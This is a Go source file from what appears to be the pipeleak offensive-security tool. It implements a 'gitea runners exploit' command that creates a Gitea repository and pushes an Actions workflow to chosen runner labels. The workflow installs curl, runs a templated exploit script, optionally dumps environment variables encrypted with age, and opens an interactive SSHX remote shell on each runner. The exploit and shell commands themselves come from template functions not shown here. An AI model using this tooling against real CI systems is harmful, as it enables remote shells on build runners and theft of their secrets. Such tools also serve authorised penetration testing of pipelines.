package runners

import (
	"code.gitea.io/sdk/gitea"
	"github.com/CompassSecurity/pipeleak/pkg/runners/template"
	"github.com/rs/zerolog/log"
	"github.com/spf13/cobra"
	"gopkg.in/yaml.v3"
)

var runnerLabels []string
var ageEncryptionPublicKey string
var repoName string
var dry bool
var shell bool

func NewRunnersExploitCmd() *cobra.Command {
	exploitCmd := &cobra.Command{
		Use:   "exploit",
		Short: "Create repository with Gitea Actions workflow to exploit available runners",
		Long:  "Creates a repository, generates a workflow with jobs for available runner labels.",
		Example: `
# Creates a repository with jobs for runners with ubuntu-latest and self-hosted labels. Dumps envs encrypted using Age and starts an interactive SSHX shell.		
pipeleak gitea runners exploit --token xxxxx --gitea https://gitea.mydomain.com --labels ubuntu-latest,self-hosted --age-public-key age1... --repo-name my-exploit-repo --dry=false --shell=true

# Print the generated workflow YAML only, does NOT create a repository or jobs
pipeleak gitea runners exploit --token xxxxx --gitea https://gitea.mydomain.com --dry=true --shell=true
 		`,
		Run: Exploit,
	}

	exploitCmd.Flags().StringSliceVarP(&runnerLabels, "labels", "", []string{}, "Jobs with the following runner labels are created")
	exploitCmd.Flags().StringVarP(&ageEncryptionPublicKey, "age-public-key", "", "", "An age public key generated with ./age-keygen -o key.txt (repo: https://github.com/FiloSottile/age). Prints the encrypted environment variables in the output log.")
	exploitCmd.Flags().StringVarP(&repoName, "repo-name", "", "pipeleak-runner-test", "The name for the created repository")
	exploitCmd.PersistentFlags().BoolVarP(&dry, "dry", "d", false, "Only generate and print the workflow YAML, do NOT create real jobs")
	exploitCmd.PersistentFlags().BoolVarP(&shell, "shell", "s", true, "Add an SSHX interactive shell to the jobs")

	return exploitCmd
}

func Exploit(cmd *cobra.Command, args []string) {
	exploitRunners(runnerLabels, dry, shell, giteaApiToken, giteaUrl, ageEncryptionPublicKey, repoName)
	log.Info().Msg("Done, Bye Bye ðŸ³ï¸â€ðŸŒˆðŸ”¥")
}

type GiteaWorkflow struct {
	Name string                    `yaml:"name"`
	On   map[string]interface{}    `yaml:"on"`
	Jobs map[string]GiteaJob       `yaml:"jobs"`
}

type GiteaJob struct {
	RunsOn []string `yaml:"runs-on"`
	Steps  []GiteaStep `yaml:"steps"`
}

type GiteaStep struct {
	Name string `yaml:"name,omitempty"`
	Run  string `yaml:"run,omitempty"`
	Uses string `yaml:"uses,omitempty"`
}

func exploitRunners(runnerLabels []string, dry bool, shell bool, giteaApiToken string, giteaUrl string, ageEncryptionPublicKey string, repoName string) {

	workflowYml := generateWorkflowYml(runnerLabels, shell, ageEncryptionPublicKey)

	if len(ageEncryptionPublicKey) > 0 {
		log.Info().Msg("Decrypt age (https://github.com/FiloSottile/age/releases) output locally using: age --decrypt -i key.txt age_output.txt")
	}

	if dry {
		log.Info().Msg("Generated Gitea Actions workflow YAML:")
		log.Info().Msg(workflowYml)
		log.Info().Msg("Create your repository and .gitea/workflows/exploit.yml manually")
		return
	}

	client, err := gitea.NewClient(giteaUrl, gitea.SetToken(giteaApiToken))
	if err != nil {
		log.Fatal().Stack().Err(err).Msg("Failed creating gitea client")
	}

	opts := &gitea.CreateRepoOption{
		Name:     repoName,
		AutoInit: true,
	}

	repo, _, err := client.CreateRepo(*opts)
	if err != nil {
		log.Fatal().Stack().Err(err).Msg("Failed creating repository")
	}

	log.Info().Str("name", repo.Name).Str("url", repo.HTMLURL).Msg("Created repository")

	fileOpts := &gitea.CreateFileOptions{
		FileOptions: gitea.FileOptions{
			BranchName: "main",
			Message:    "Pipeleak create workflow",
		},
		Content: workflowYml,
	}

	fileInfo, _, err := client.CreateFile(repo.Owner.UserName, repo.Name, ".gitea/workflows/exploit.yml", *fileOpts)

	if err != nil {
		log.Fatal().Stack().Err(err).Msg("Creating workflow file failed")
	}

	log.Info().Str("file", fileInfo.Content.Path).Msg("Created workflow file")
	log.Info().Str("url", repo.HTMLURL+"/actions").Msg("Check workflow runs manually")
	log.Info().Msg("Make sure to delete the repository when done")
}

func generateWorkflowYml(runnerLabels []string, shell bool, ageEncryptionPublicKey string) string {
	workflow := GiteaWorkflow{
		Name: "Pipeleak Runner Exploit",
		On: map[string]interface{}{
			"push": map[string]interface{}{
				"branches": []string{"main"},
			},
		},
		Jobs: make(map[string]GiteaJob),
	}

	if len(runnerLabels) == 0 {
		runnerLabels = []string{"ubuntu-latest"}
	}

	for _, label := range runnerLabels {
		jobName := "pipeleak-job-" + label
		job := createExploitJob([]string{label}, shell, ageEncryptionPublicKey)
		workflow.Jobs[jobName] = job
	}

	yamlData, err := yaml.Marshal(&workflow)
	if err != nil {
		log.Fatal().Stack().Err(err).Msg("Failed marshalling yaml")
	}

	return string(yamlData)
}

func createExploitJob(labels []string, shell bool, ageEncryptionPublicKey string) GiteaJob {
	job := GiteaJob{
		RunsOn: labels,
		Steps:  []GiteaStep{},
	}

	job.Steps = append(job.Steps, GiteaStep{
		Name: "Setup environment",
		Run:  "apt update && apt install curl libcap2-bin -y || yum install -y curl || apk add curl",
	})

	exploitCommands := template.ExploitScript()
	job.Steps = append(job.Steps, GiteaStep{
		Name: "Run exploit",
		Run:  joinCommands(exploitCommands),
	})

	if len(ageEncryptionPublicKey) > 0 {
		ageCommands := template.GetAgeEncryptionCommands(ageEncryptionPublicKey)
		job.Steps = append(job.Steps, GiteaStep{
			Name: "Encrypt environment variables",
			Run:  joinCommands(ageCommands),
		})
	}

	if shell {
		job.Steps = append(job.Steps, GiteaStep{
			Name: "Start SSHX shell",
			Run:  template.GetShellCommand(),
		})
	}

	return job
}

func joinCommands(commands []string) string {
	result := ""
	for i, cmd := range commands {
		result += cmd
		if i < len(commands)-1 {
			result += "\n"
		}
	}
	return result
}
